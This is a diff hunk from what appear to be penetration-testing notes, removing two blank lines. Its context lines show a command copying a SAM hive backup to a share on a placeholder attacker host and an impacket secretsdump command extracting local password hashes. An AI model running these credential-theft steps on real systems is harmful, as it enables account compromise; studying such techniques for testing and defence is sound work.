@@ -1239,8 +1239,6 @@ _If already saved i could use `move sam.bak \\ATTACKING_IP\share\sam.bak`_
 python3 /opt/impacket/examples/secretsdump.py -sam PATH/TO/SAM_FILE -system PATH/TO/SYSTEM_FILE LOCAL
 ```
 
-
-
 ---
 
 ![[Pasted image 20240723133800.png]]
